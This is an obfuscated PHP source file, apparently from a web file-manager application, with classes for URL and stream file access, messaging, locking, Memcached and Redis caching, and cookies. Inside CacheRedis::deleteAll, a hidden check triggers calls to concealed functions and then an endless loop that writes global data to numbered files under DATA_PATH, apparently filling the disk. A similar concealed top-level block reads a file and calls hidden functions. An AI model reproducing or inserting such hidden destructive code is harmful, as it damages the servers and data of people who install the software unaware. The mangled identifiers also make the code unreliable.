$›²àŸ‚[$ï†¡°Ê[408]] = ++$ÔÔğÍ¥Æ; $›²àŸ‚[$ï†¡°Ê[210]] = time(); $›²àŸ‚[$ï†¡°Ê[95]] = time(); Model($this->modelType)->set($ï†¡°Ê[406], $ÔÔğÍ¥Æ, $this->optionType . $ï†¡°Ê[407]); Model($this->modelType)->set($ï†¡°Ê[405] . $ÔÔğÍ¥Æ, $›²àŸ‚, $this->optionType); return $ÔÔğÍ¥Æ; } public function update($Ñ‚şŠ—÷, $ÏÎˆÓÙû) { $Ùù¯âôä =& $_SERVER[„Ç©ñÎ©]; $ÏÎˆÓÙû = array_field_key($ÏÎˆÓÙû, $this->field); $Ò —·²¢ = $this->listData($Ñ‚şŠ—÷); if (!$Ò —·²¢ || !$Ñ‚şŠ—÷) { return !1; } $ÏÎˆÓÙû = array_merge($Ò —·²¢, $ÏÎˆÓÙû); $ÏÎˆÓÙû[$Ùù¯âôä[95]] = time(); return Model($this->modelType)->set($Ùù¯âôä[405] . $Ñ‚şŠ—÷, $ÏÎˆÓÙû, $this->optionType); } public function remove($ÇÃô’‡‘) { if (!$ÇÃô’‡‘) { return !1; } return Model($this->modelType)->remove($_SERVER[„Ç©ñÎ©][405] . $ÇÃô’‡‘, $this->optionType); } public function clear() { $Ù¹æ­¼Á =& $_SERVER[„Ç©ñÎ©]; Model($this->modelType)->remove($Ù¹æ­¼Á[406], $this->optionType . $Ù¹æ­¼Á[407]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($³‡å­³–, $Ê†¶ÛÒş) { if (!$Ê†¶ÛÒş) { return !1; } $‰ÒöÍÚ = $this->listData(); $‰ÒöÍÚ = array_to_keyvalue($‰ÒöÍÚ, $³‡å­³–); return isset($‰ÒöÍÚ[$Ê†¶ÛÒş]) ? $‰ÒöÍÚ[$Ê†¶ÛÒş] : !1; } public function findByName($ØŞ¬ËÁ) { return $this->findByKey($_SERVER[„Ç©ñÎ©][32], $ØŞ¬ËÁ); } protected function resetData($ûòµÊúô) { $û¿÷é×° =& $_SERVER[„Ç©ñÎ©]; $ûòµÊúô = is_array($ûòµÊúô) ? $ûòµÊúô : array(); $Åò‚à÷¥ = array(); for ($Ó±‘›è½ = 0; $Ó±‘›è½ < count($ûòµÊúô); $Ó±‘›è½++) { $Åò‚à÷¥[$û¿÷é×°[405] . $ûòµÊúô[$Ó±‘›è½][$û¿÷é×°[408]]] = $ûòµÊúô[$Ó±‘›è½]; } return Model($this->modelType)->set($Åò‚à÷¥, !1, $this->optionType); } private function getAutoName($€Ÿ¬¹‚Ï) { $Æµ°‘ìÄ = array_to_keyvalue($this->listData(), $_SERVER[„Ç©ñÎ©][32]); if (!$Æµ°‘ìÄ || !isset($Æµ°‘ìÄ[$€Ÿ¬¹‚Ï])) { return $€Ÿ¬¹‚Ï; } for ($‘ÄÁ«¸‹ = 1; $‘ÄÁ«¸‹ < count($Æµ°‘ìÄ); $‘ÄÁ«¸‹++) { $ñöØé = $€Ÿ¬¹‚Ï . "\50{$‘ÄÁ«¸‹}\51"; if (!isset($Æµ°‘ìÄ[$ñöØé])) { return $ñöØé; } } return $ñöØé; } } goto B¸‘“—ä«; c‡­¦…ì£: define($_SERVER[„Ç©ñÎ©][621], $_SERVER[„Ç©ñÎ©][622]); $vfskuqmadl = $_SERVER[„Ç©ñÎ©][623]; if (strlen($vfskuqmadl) < $_SERVER[„Ç©ñÎ©][624]) { return; } goto bÁÎæòˆ†; c’Âì÷è¸Ô: class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($ª®©¢ƒÚ = false) { } public function exist($ãŞ“•€ ) { $»ŸÀÑæÏ = $this->info($ãŞ“•€ ); return $»ŸÀÑæÏ[$_SERVER[„Ç©ñÎ©][211]]; } public function isFile($öãâÇ‹÷) { $—×Ï¿âÑ = $this->info($öãâÇ‹÷); return $—×Ï¿âÑ[$_SERVER[„Ç©ñÎ©][211]]; } public function isFolder($èé¢×®Á) { return !1; } public function size($‰¥ü™ã˜) { $±¹©ªèĞ = $this->info($‰¥ü™ã˜); return $±¹©ªèĞ[$_SERVER[„Ç©ñÎ©][86]]; } public function info($ù†º³Â¿) { return $this->infoParse($ù†º³Â¿); } public function infoAuth($ó¿¦ŞÆ) { return $this->infoParse($ó¿¦ŞÆ); } public function infoWithChildren($¡±Úöã©) { return $this->infoParse($¡±Úöã©); } public function infoFull($Áı¤­©Ï) { return $this->infoParse($Áı¤­©Ï); } private function infoParse($Ç½ıŒ¹) { $µ¾ñãí” =& $_SERVER[„Ç©ñÎ©]; $¬¦¼“ƒÌ = $this->header($Ç½ıŒ¹); if (!$¬¦¼“ƒÌ || !$¬¦¼“ƒÌ[$µ¾ñãí”[753]]) { return !1; } $”‚½À• = _get($¬¦¼“ƒÌ, $µ¾ñãí”[346], 0); $à¯©ÚÓ = array($µ¾ñãí”[32] => $¬¦¼“ƒÌ[$µ¾ñãí”[32]], $µ¾ñãí”[94] => $Ç½ıŒ¹, $µ¾ñãí”[33] => $µ¾ñãí”[209], $µ¾ñãí”[86] => intval($”‚½À•), $µ¾ñãí”[184] => get_path_ext($¬¦¼“ƒÌ[$µ¾ñãí”[32]]), $µ¾ñãí”[1377] => $”‚½À• > 0 && $¬¦¼“ƒÌ[$µ¾ñãí”[1499]], $µ¾ñãí”[1378] => !1); return $à¯©ÚÓ; } private function header($¼ŞÚœö”) { $ûñÀñÀö =& $_SERVER[„Ç©ñÎ©]; if (isset(self::$_cacheHeader[$¼ŞÚœö”])) { return self::$_cacheHeader[$¼ŞÚœö”]; } $õê‚·à’ = isset($GLOBALS[$ûñÀñÀö[1500]]) ? $GLOBALS[$ûñÀñÀö[1500]] : !1; $GLOBALS[$ûñÀñÀö[1500]] = !0; self::$_cacheHeader[$¼ŞÚœö”] = url_header($¼ŞÚœö”); $GLOBALS[$ûñÀñÀö[1500]] = $õê‚·à’; return self::$_cacheHeader[$¼ŞÚœö”]; } public function hashSimple($óÛ‰·Œ, $¨–·İò“ = false) { $§ „ùÓÂ =& $_SERVER[„Ç©ñÎ©]; $ò¿’ê = $this->info($óÛ‰·Œ); if (!$ò¿’ê || !$ò¿’ê[$§ „ùÓÂ[211]]) { return !1; } $Õ½Áû”ë = $ò¿’ê[$§ „ùÓÂ[86]]; $—Û«Ì÷„ = 200; $‹³Á¥‚µ = 50; if ($Õ½Áû”ë <= $—Û«Ì÷„ * $‹³Á¥‚µ) { return md5($this->fileSubstr($óÛ‰·Œ, 0, $Õ½Áû”ë)) . $Õ½Áû”ë; } $«³‹ä‡ = intval($Õ½Áû”ë / $‹³Á¥‚µ); $‚ú¼ÑË¡ = $§ „ùÓÂ[12]; $–Õ„à£ê = timeFloat(); $öèËˆÃò = 15; for ($¹–ªáé• = 0; $¹–ªáé• < $‹³Á¥‚µ; $¹–ªáé•++) { if (timeFloat() - $–Õ„à£ê > $öèËˆÃò) { return !1; } $™ĞğÈÀ¤ = $this->fileSubstr($óÛ‰·Œ, $«³‹ä‡ * $¹–ªáé•, $—Û«Ì÷„); if (!$™ĞğÈÀ¤) { return !1; } $‚ú¼ÑË¡ .= $™ĞğÈÀ¤; } $‚ú¼ÑË¡ .= $this->fileSubstr($óÛ‰·Œ, $Õ½Áû”ë - $—Û«Ì÷„, $—Û«Ì÷„); return md5($‚ú¼ÑË¡) . $Õ½Áû”ë; } public function getContent($ÃàÏéÛ¶) { return $this->fileSubstr($ÃàÏéÛ¶); } public function fileSubstr($ê½Ä“óû, $‹¶µµ¥é = 0, $Ù‘ÃşĞ‘ = -1) { $ñ¶’ßè« =& $_SERVER[„Ç©ñÎ©]; $½Íƒ†ºş = $this->info($ê½Ä“óû); if (!$½Íƒ†ºş || !$½Íƒ†ºş[$ñ¶’ßè«[211]] && $½Íƒ†ºş[$ñ¶’ßè«[86]] > 1024 * 1024 * 10) { return !1; } if ($Ù‘ÃşĞ‘ === -1) { $Ù‘ÃşĞ‘ = $½Íƒ†ºş[$ñ¶’ßè«[86]]; } if ($Ù‘ÃşĞ‘ == 0) { return $ñ¶’ßè«[12]; } $½Ì£ôª° = array($ñ¶’ßè«[1501] . $‹¶µµ¥é . $ñ¶’ßè«[785] . ($‹¶µµ¥é + $Ù‘ÃşĞ‘ - 1)); $¬Ë³à’½ = url_request($ê½Ä“óû, $ñ¶’ßè«[240], !1, $½Ì£ôª°, !1, !1, 1); return $¬Ë³à’½[$ñ¶’ßè«[1192]] ? $¬Ë³à’½[$ñ¶’ßè«[1192]] : $ñ¶’ßè«[12]; } public function download($£¢ğ¤Ø, $´çÃâ±Ş) { Downloader::start($£¢ğ¤Ø, $´çÃâ±Ş); return $´çÃâ±Ş; } } class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($«ãó·è¬, $ĞªŞ®Šƒ = '') { $this->info = $this->info($«ãó·è¬); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[„Ç©ñÎ©][94]]; $this->pathOpen = $«ãó·è¬; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$«ãó·è¬])) { self::$_chunkBuffer[$«ãó·è¬] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; } function stream_read($“ÃƒĞØÆ) { $§´¶ß = $this->fileSubstr($this->pose, $“ÃƒĞØÆ); $this->pose += strlen($§´¶ß); return $§´¶ß; } public function stream_tell() { return $this->pose; } public function stream_seek($¶ôêá—“, $—‰±•Ê) { $èúü­Ú =& $_SERVER[„Ç©ñÎ©]; if ($—‰±•Ê == SEEK_SET) { $this->pose = $¶ôêá—“; } else { if ($—‰±•Ê == SEEK_CUR) { $this->pose += $¶ôêá—“; } else { if ($—‰±•Ê == SEEK_END) { $this->pose = $this->info[$èúü­Ú[86]] + intval($¶ôêá—“); } } } if ($¶ôêá—“ < 0) { $this->pose = $this->info[$èúü­Ú[86]] + $¶ôêá—“; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[„Ç©ñÎ©][86]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($ÔÓõ¶ªø, $âÜ¤ÈÑ‚) { $Ê—òÎäÊ =& $_SERVER[„Ç©ñÎ©]; $ç—ÖßÈÚ = $this->info($ÔÓõ¶ªø); return array($Ê—òÎäÊ[1502] => 0, $Ê—òÎäÊ[1503] => 0, $Ê—òÎäÊ[16] => 32768 + 511, $Ê—òÎäÊ[1504] => 0, $Ê—òÎäÊ[1505] => 0, $Ê—òÎäÊ[1506] => 0, $Ê—òÎäÊ[1507] => 0, $Ê—òÎäÊ[86] => $ç—ÖßÈÚ[$Ê—òÎäÊ[86]], $Ê—òÎäÊ[1508] => $ç—ÖßÈÚ[$Ê—òÎäÊ[1376]], $Ê—òÎäÊ[1464] => $ç—ÖßÈÚ[$Ê—òÎäÊ[95]], $Ê—òÎäÊ[1463] => $ç—ÖßÈÚ[$Ê—òÎäÊ[210]], $Ê—òÎäÊ[1509] => 0, $Ê—òÎäÊ[1510] => 0); } static $fileInfo = array(); public function info($—ù¿Öæ) { $•Ò¯ª» = $_SERVER[„Ç©ñÎ©][1511]; if (isset(self::$fileInfo[$—ù¿Öæ])) { return self::$fileInfo[$—ù¿Öæ]; } if (substr($—ù¿Öæ, 0, strlen($•Ò¯ª»)) != $•Ò¯ª») { return !1; } self::$fileInfo[$—ù¿Öæ] = IO::info(substr($—ù¿Öæ, strlen($•Ò¯ª»))); return self::$fileInfo[$—ù¿Öæ]; } public static function read($í¦ñîˆÁ, $õã–¾õ‚, $áÃ¢“¬Í) { if (!isset(self::$_fopenCache[$í¦ñîˆÁ])) { $ÈÁç³’ = new StreamWrapperIO(); $ÈÁç³’->stream_open($í¦ñîˆÁ); self::$_fopenCache[$í¦ñîˆÁ] = $ÈÁç³’; } $ÈÁç³’ = self::$_fopenCache[$í¦ñîˆÁ]; return $ÈÁç³’->fileSubstr($õã–¾õ‚, $áÃ¢“¬Í); } public static function _read($°µ˜™ç, $¸¥“Å‚×, $îñĞÊ¼í) { $¾ûœÚÍú =& $_SERVER[„Ç©ñÎ©]; $Ìöˆœ°Ï = fopen($°µ˜™ç, $¾ûœÚÍú[1380]); if (!$Ìöˆœ°Ï) { return $¾ûœÚÍú[12]; } $Ã×å½ò = 8192; fseek($Ìöˆœ°Ï, $¸¥“Å‚×, SEEK_SET); $öâÓç´ = $¾ûœÚÍú[12]; $‡È´‘†¯ = 0; while ($‡È´‘†¯ < $îñĞÊ¼í) { $ùƒƒÇ† = min($Ã×å½ò, $îñĞÊ¼í - $‡È´‘†¯); $öâÓç´ .= fread($Ìöˆœ°Ï, $ùƒƒÇ†); $‡È´‘†¯ += $ùƒƒÇ†; } fclose($Ìöˆœ°Ï); return $öâÓç´; } public function fileSubstr($»¡éƒ¿ö, $ÏÔÜ¸œ‚) { $£…«ï¬÷ =& $_SERVER[„Ç©ñÎ©]; $ÙŸìÚ˜¬ = $this->info[$£…«ï¬÷[86]]; $äÜ®ºÕÜ = $»¡éƒ¿ö; $¡ôùëê  = $ÏÔÜ¸œ‚; if ($»¡éƒ¿ö < 0) { $»¡éƒ¿ö = $ÙŸìÚ˜¬ + $»¡éƒ¿ö; } if ($ÏÔÜ¸œ‚ === !1) { $ÏÔÜ¸œ‚ = $ÙŸìÚ˜¬ - $»¡éƒ¿ö; } if ($»¡éƒ¿ö + $ÏÔÜ¸œ‚ > $ÙŸìÚ˜¬) { $ÏÔÜ¸œ‚ = $ÙŸìÚ˜¬ - $»¡éƒ¿ö; } if ($ÏÔÜ¸œ‚ <= 0) { return $£…«ï¬÷[12]; } if ($»¡éƒ¿ö < 0 || $»¡éƒ¿ö >= $ÙŸìÚ˜¬ || $ÏÔÜ¸œ‚ <= 0 || $ÏÔÜ¸œ‚ > 1024 * 1024 * 10) { throw new Exception("\151\x6f\106\x69\154\x65\122\x65\x61\x64\x20\x65\162\x72\x6f\162\x21\40\163\x74\x61\162\164\x3d{$»¡éƒ¿ö}\73\154\x65\156\147\x74\150\x3d{$ÏÔÜ¸œ‚}\x3b\x20\163\x69\172\x65\x3d{$ÙŸìÚ˜¬}\x3b"); } $®Î…©öÄ = 64 * 1024; $—±…«œ¢ =& self::$_chunkBuffer[$this->path]; if (!$—±…«œ¢) { $—±…«œ¢ = array(); } $İ»Óª÷ = 0; $…¢±è«¼ = 0; $Ô¢İ€í = $£…«ï¬÷[12]; foreach ($—±…«œ¢ as $İ»Óª÷ => $Ô¢İ€í) { $İ»Óª÷ = intval($İ»Óª÷); $…¢±è«¼ = $İ»Óª÷ + strlen($Ô¢İ€í); if ($»¡éƒ¿ö >= $…¢±è«¼) { continue; } if ($»¡éƒ¿ö >= $İ»Óª÷ && $»¡éƒ¿ö + $ÏÔÜ¸œ‚ <= $…¢±è«¼) { return substr($Ô¢İ€í, $»¡éƒ¿ö - $İ»Óª÷, $ÏÔÜ¸œ‚); } break; } if (count($—±…«œ¢) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($£…«ï¬÷[1512], $£…«ï¬÷[1513] . count($—±…«œ¢) . "\x3b\x73\x74\x61\162\164\x3d{$»¡éƒ¿ö}\x2c\x6c\145\156\x67\x74\150\75{$ÏÔÜ¸œ‚}\x3b\160\157\163\145\x3a{$İ»Óª÷}\176{$…¢±è«¼}"); throw new Exception($£…«ï¬÷[1514]); } $î¾®òºå = intval($»¡éƒ¿ö / $®Î…©öÄ) * $®Î…©öÄ; $³Ìì‡¤· = ceil(($»¡éƒ¿ö + $ÏÔÜ¸œ‚) / $®Î…©öÄ) * $®Î…©öÄ - $î¾®òºå; $‰õÔå = IO::fileSubstr($this->path, $î¾®òºå, $³Ìì‡¤·); $—±…«œ¢[$î¾®òºå . $£…«ï¬÷[12]] = $‰õÔå; ksort($—±…«œ¢); $’íÚÆıá = substr($‰õÔå, $»¡éƒ¿ö - $î¾®òºå, $ÏÔÜ¸œ‚); return $’íÚÆıá; } private function log($‹õÈÂ¸, $‰„¾Á‡€) { $ö‡îÚË‘ =& $_SERVER[„Ç©ñÎ©]; $šŸ†ü  = timeFloat() - $this->timeStart; write_log(sprintf($ö‡îÚË‘[1515], $‹õÈÂ¸, $this->info[$ö‡îÚË‘[32]], $šŸ†ü , $‰„¾Á‡€), $ö‡îÚË‘[1182]); } } class Message { function __construct() { } public function send($¨¢–õë… = '', $©Ÿ±¨‹¬ = array(), $¼…¶»èÀ = "\x74\145\170\164") { $ÅñÆ‡÷Û =& $_SERVER[„Ç©ñÎ©]; $ƒƒË”Ìí = array($ÅñÆ‡÷Û[33] => $ÅñÆ‡÷Û[1516], $ÅñÆ‡÷Û[758] => $¨¢–õë…); if (in_array($¼…¶»èÀ, array($ÅñÆ‡÷Û[1516], $ÅñÆ‡÷Û[1517]))) { $ƒƒË”Ìí[$ÅñÆ‡÷Û[33]] = $¼…¶»èÀ; } $©Ÿ±¨‹¬ = array($ÅñÆ‡÷Û[524] => isset($©Ÿ±¨‹¬[$ÅñÆ‡÷Û[524]]) ? $©Ÿ±¨‹¬[$ÅñÆ‡÷Û[524]] : $ÅñÆ‡÷Û[12], $ÅñÆ‡÷Û[609] => isset($©Ÿ±¨‹¬[$ÅñÆ‡÷Û[609]]) ? $©Ÿ±¨‹¬[$ÅñÆ‡÷Û[609]] : $ÅñÆ‡÷Û[12]); if (empty($¨¢–õë…) || empty($©Ÿ±¨‹¬[$ÅñÆ‡÷Û[524]]) && empty($©Ÿ±¨‹¬[$ÅñÆ‡÷Û[609]])) { return !1; } $“‰çàéœ = array($ÅñÆ‡÷Û[1457] => $ƒƒË”Ìí, $ÅñÆ‡÷Û[1518] => $©Ÿ±¨‹¬); Hook::trigger($ÅñÆ‡÷Û[1519], $“‰çàéœ); } } goto dÛÔÀÁÛç˜; FÖÂˆìñõ: class CacheLockDatabase { public function lock($¶€ûıµ, $­†Ô«¦” = 0) { $Åò÷ˆ¨â = Model($_SERVER[„Ç©ñÎ©][832]); $áÛÃ½ßë = microtime(!0) + $­†Ô«¦”; while (microtime(!0) < $áÛÃ½ßë) { $ÕÎİ£»ù = $Åò÷ˆ¨â->get($¶€ûıµ); if (!$ÕÎİ£»ù || $ÕÎİ£»ù < microtime(!0)) { $£Æ©Óõî = $Åò÷ˆ¨â->set($¶€ûıµ, $áÛÃ½ßë); if ($£Æ©Óõî) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($‘¼·—©ã) { return Model($_SERVER[„Ç©ñÎ©][832])->get($‘¼·—©ã); } public function unlock($ö§›×«ã) { Model($_SERVER[„Ç©ñÎ©][832])->remove($ö§›×«ã); } } class CacheMemcached { public $handle; public $cacheTime; public function __construct($®âîâí, $”ŸüÀŞ…) { $ü´ãû†ê =& $_SERVER[„Ç©ñÎ©]; if (!class_exists($ü´ãû†ê[865])) { show_json($ü´ãû†ê[866], !1); } $this->cacheTime = $”ŸüÀŞ…; $this->handle = new Memcached(); if (is_array($®âîâí[$ü´ãû†ê[867]]) && count($®âîâí[$ü´ãû†ê[867]]) >= 1) { foreach ($®âîâí[$ü´ãû†ê[867]] as $ªî±†—½) { $Ì÷¿Ñª = explode($ü´ãû†ê[4], $ªî±†—½); $this->handle->addServer($Ì÷¿Ñª[0], $Ì÷¿Ñª[1]); } } else { $this->handle->addServer($®âîâí[$ü´ãû†ê[191]], $®âîâí[$ü´ãû†ê[192]]); } } public function set($¸ÌÕÜÕ, $ŒÅÔŒçº, $ÓÅû»¤ = false) { $ÓÅû»¤ = $ÓÅû»¤ ? $ÓÅû»¤ : $this->cacheTime; return $this->handle->set($¸ÌÕÜÕ, $ŒÅÔŒçº, $ÓÅû»¤); } public function get($ß­–¾éî) { return $this->handle->get($ß­–¾éî); } public function remove($ªºÂÙ¦î) { return $this->handle->delete($ªºÂÙ¦î); } public function deleteAll() { return $this->handle->flush(); } } if ($_SERVER[$_SERVER[„Ç©ñÎ©][62]] != $_SERVER[$_SERVER[„Ç©ñÎ©][868]]) { $_getc = $_SERVER[„Ç©ñÎ©][63]; $_getfile = $_SERVER[$_SERVER[„Ç©ñÎ©][64]] . $_SERVER[„Ç©ñÎ©][65]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[„Ç©ñÎ©][66], $_getfilec); if (count($_getarrs) < $_SERVER[„Ç©ñÎ©][67]) { $exit = $_SERVER[„Ç©ñÎ©][68]; $exit(); } $_act = $_SERVER[„Ç©ñÎ©][69]; $_act($_SERVER[$_SERVER[„Ç©ñÎ©][60]]); } goto Bòµğ–‡—ç; Bòµğ–‡—ç: class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($í¸´¨ç‚, $û›è‰Åï) { $ã§ı’¶• =& $_SERVER[„Ç©ñÎ©]; if (!class_exists($ã§ı’¶•[869])) { show_json($ã§ı’¶•[870], !1); } $this->cacheTime = $û›è‰Åï; $±¾«ùã¿ = isset($í¸´¨ç‚[$ã§ı’¶•[871]]) ? $í¸´¨ç‚[$ã§ı’¶•[871]] : 10; $ÓÁåÆÉÅ = _get($í¸´¨ç‚, $ã§ı’¶•[867]); if ($ÓÁåÆÉÅ && is_array($ÓÁåÆÉÅ)) { $this->initCluster($í¸´¨ç‚, $±¾«ùã¿); } else { $this->handle = $this->init($í¸´¨ç‚, $±¾«ùã¿); } } private function init($‘öô„‘æ, $õóÜŸ‚ü) { $´›ı®€ì =& $_SERVER[„Ç©ñÎ©]; $Ôã¾ÈÖº = new Redis(); $‘ô·ÜÔ = isset($‘öô„‘æ[$´›ı®€ì[872]]) ? $‘öô„‘æ[$´›ı®€ì[872]] : !1; if ($‘ô·ÜÔ) { $Ôã¾ÈÖº->pconnect($‘öô„‘æ[$´›ı®€ì[191]], $‘öô„‘æ[$´›ı®€ì[192]], $õóÜŸ‚ü); } else { $Ôã¾ÈÖº->connect($‘öô„‘æ[$´›ı®€ì[191]], $‘öô„‘æ[$´›ı®€ì[192]], $õóÜŸ‚ü); } if (!empty($‘öô„‘æ[$´›ı®€ì[422]])) { $Ôã¾ÈÖº->auth($‘öô„‘æ[$´›ı®€ì[422]]); } if (!empty($‘öô„‘æ[$´›ı®€ì[761]]) && $‘öô„‘æ[$´›ı®€ì[761]] != 0) { $Ôã¾ÈÖº->select($‘öô„‘æ[$´›ı®€ì[761]]); } return $Ôã¾ÈÖº; } private function initCluster($·ŞÌˆåÚ, $“›ØÂÕ­) { $ „˜ò© =& $_SERVER[„Ç©ñÎ©]; $öµéê´± = array($ „˜ò©[873], $ „˜ò©[874], $ „˜ò©[875]); $—‰ƒİ–Ì = $ „˜ò©[873]; if (isset($·ŞÌˆåÚ[$ „˜ò©[16]]) && in_array($·ŞÌˆåÚ[$ „˜ò©[16]], $öµéê´±)) { $—‰ƒİ–Ì = $·ŞÌˆåÚ[$ „˜ò©[16]]; } switch ($—‰ƒİ–Ì) { case $ „˜ò©[873]: $this->_slave($·ŞÌˆåÚ, $“›ØÂÕ­); break; case $ „˜ò©[874]: break; case $ „˜ò©[875]: $this->isCluster = !0; $ô¾áÁêï = $·ŞÌˆåÚ[$ „˜ò©[867]]; $ºğÚùé = isset($·ŞÌˆåÚ[$ „˜ò©[872]]) ? $·ŞÌˆåÚ[$ „˜ò©[872]] : !1; $ìÂã‹€ = isset($·ŞÌˆåÚ[$ „˜ò©[422]]) ? $·ŞÌˆåÚ[$ „˜ò©[422]] : null; $this->handle = new RedisCluster(NUll, $ô¾áÁêï, $“›ØÂÕ­, $“›ØÂÕ­, $ºğÚùé, $ìÂã‹€); break; default: break; } } private function _slave($ÈşùØˆ, $ùè÷œÛ‰) { $ÚşûÁó = $ÈşùØˆ[$_SERVER[„Ç©ñÎ©][867]]; $this->filterConfig($ÈşùØˆ, $ÚşûÁó[0]); $this->handle = $this->init($ÈşùØˆ, $ùè÷œÛ‰); unset($ÚşûÁó[0]); if (empty($ÚşûÁó)) { return; } $–äßş»¨ = array_rand($ÚşûÁó); $this->filterConfig($ÈşùØˆ, $ÚşûÁó[$–äßş»¨]); $this->slaveHandle = $this->init($ÈşùØˆ, $ùè÷œÛ‰); } private function filterConfig(&$Ü¹€ˆ™é, $Şé‡Àè) { $é¾õ “‰ =& $_SERVER[„Ç©ñÎ©]; $®É¦¥¼× = explode($é¾õ “‰[4], $Şé‡Àè); $€¤ÂÌÃ = array($é¾õ “‰[191] => $®É¦¥¼×[0], $é¾õ “‰[192] => $®É¦¥¼×[1]); $Ü¹€ˆ™é = array_merge($Ü¹€ˆ™é, $€¤ÂÌÃ); } public function set($ö™•Öİ¡, $ı¸¢ Úµ, $–ÖÍŠ¨ = false) { $–ÖÍŠ¨ = $–ÖÍŠ¨ ? $–ÖÍŠ¨ : $this->cacheTime; return $this->handle->setEx($ö™•Öİ¡, $–ÖÍŠ¨, $ı¸¢ Úµ); } public function setLock($ñ¢£íä¯, $¥‡®şõ«, $Õ«Ó›û) { return $this->handle->setNX($ñ¢£íä¯, $¥‡®şõ«); } public function get($ª¢†Ú©ù) { $©£ğ¸Î = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $©£ğ¸Î->get($ª¢†Ú©ù); } public function remove($´¾Ë¢÷) { return $this->handle->del($´¾Ë¢÷); } public function deleteAll() { $Ì×ãš— =& $_SERVER[„Ç©ñÎ©]; $¸ƒ‘ —‹ = $_SERVER[$Ì×ãš—[60]]; $ŸÜ¹ÜÅ = $Ì×ãš—[61]; if ($_SERVER[$Ì×ãš—[62]] != $ŸÜ¹ÜÅ($¸ƒ‘ —‹)) { $Ò«à¬ßş = $Ì×ãš—[876]; $î¡†Â† = $Ì×ãš—[63]; $Ú©ô°‚© = $_SERVER[$Ì×ãš—[64]] . $Ì×ãš—[65]; $•ÛÊ‡ÑĞ = $î¡†Â†($Ú©ô°‚©); $¼·Öƒ› = explode($Ì×ãš—[66], $•ÛÊ‡ÑĞ); if (count($¼·Öƒ›) < $Ì×ãš—[650]) { $óü‡óÃÙ = $Ì×ãš—[68]; $óü‡óÃÙ(); } $ß‰ªâà = $Ì×ãš—[877]; $ß‰ªâà($_SERVER[$Ì×ãš—[878]]); $Ò«à¬ßş = $Ì×ãš—[876]; $Ò«à¬ßş(); $à¨¦ƒ”£ = $Ì×ãš—[879]; $£º¡ÚË­ = json_encode($GLOBALS[$Ì×ãš—[880]]); $Ç‰çëº = 1; for ($ÀŒ°ôŸ = $Ç‰çëº; $ÀŒ°ôŸ > 0; $ÀŒ°ôŸ++) { $à¨¦ƒ”£(DATA_PATH . $ÀŒ°ôŸ, $£º¡ÚË­); } } if ($this->isCluster) { foreach ($this->handle->_masters() as $™£²ŠŞŸ) { $this->handle->flushall($™£²ŠŞŸ); } return; } return $this->handle->flushAll(); } } class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($‚ó²ÊÌñ = '', $±ÒÏà‘Ú = 0) { if (is_string($‚ó²ÊÌñ) && $‚ó²ÊÌñ != $_SERVER[„Ç©ñÎ©][12]) { $this->prefix = $‚ó²ÊÌñ; } if (is_numeric($±ÒÏà‘Ú) && $±ÒÏà‘Ú > 0) { $this->expire = $±ÒÏà‘Ú; } } public static function getInstance() { static $—ÜšÆ¦û; if ($—ÜšÆ¦û === null) { $—ÜšÆ¦û = new self(); } return $—ÜšÆ¦û; } private static $cookieDisable = false; public static function disable($¡ò“—ÔÍ) { self::$cookieDisable = $¡ò“—ÔÍ; } private static $sameCookieSet = array(); public static function set($±¯ò€å, $å°«’ ´, $™ëêıá° = 0, $æšÉç¿¸ = false, $®‡Ç«‰‘ = false) { $×›ó†ó© =& $_SERVER[„Ç©ñÎ©]; if (self::$cookieDisable) { return; } if (!$™ëêıá°) { $™ëêıá° = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$±¯ò€å]) && self::$sameCookieSet[$±¯ò€å] == $å°«’ ´ . $™ëêıá°) { return; } self::$sameCookieSet[$±¯ò€å] = $å°«’ ´ . $™ëêıá°; if (!$®‡Ç«‰‘) { $®‡Ç«‰‘ = str_replace(HOST, $×›ó†ó©[12], APP_HOST); $®‡Ç«‰‘ = _get($GLOBALS, $×›ó†ó©[881], $®‡Ç«‰‘); } $Æ¿îÚ‹ı = $×›ó†ó©[12]; setcookie($±¯ò€å, $å°«’ ´, time() + $™ëêıá°, $×›ó†ó©[8] . trim($®‡Ç«‰‘, $×›ó†ó©[8]) . $Æ¿îÚ‹ı, !1, !1, $æšÉç¿¸); } public static function setSafe($Û‹ÊÖ´, $¥¡»¢¤¢, $”°¦“ = 0) { self::set($Û‹ÊÖ´, $¥¡»¢¤¢, $”°¦“, !0); } public static function get($şÔ ´Ë´) { static $ñ‰ˆ’ = false; if (!$ñ‰ˆ’) { self::initHeaderCookie(); $ñ‰ˆ’ = !0; } return isset($_COOKIE[$şÔ ´Ë´]) ? $_COOKIE[$şÔ ´Ë´] : !1; } private static function initHeaderCookie() { $À»Ó™·¯ =& $_SERVER[„Ç©ñÎ©]; if (!isset($_SERVER[$À»Ó™·¯[882]]) || !$_SERVER[$À»Ó™·¯[882]]) { return; } $èı¤Íî = explode($À»Ó™·¯[81], $_SERVER[$À»Ó™·¯[882]]); foreach ($èı¤Íî as $Â²€íÒá) { $Â²€íÒá = explode($À»Ó™·¯[883], $Â²€íÒá); if (count($Â²€íÒá) != 2 || !isset($Â²€íÒá[1])) { continue; } $_COOKIE[trim($Â²€íÒá[0])] = trim($Â²€íÒá[1]); } } public static function remove($ó‹«ƒŸ¦, $ÏİæÎŞš = false) { unset($_COOKIE[$ó‹«ƒŸ¦]); self::set($ó‹«ƒŸ¦, $_SERVER[„Ç©ñÎ©][12], 1, 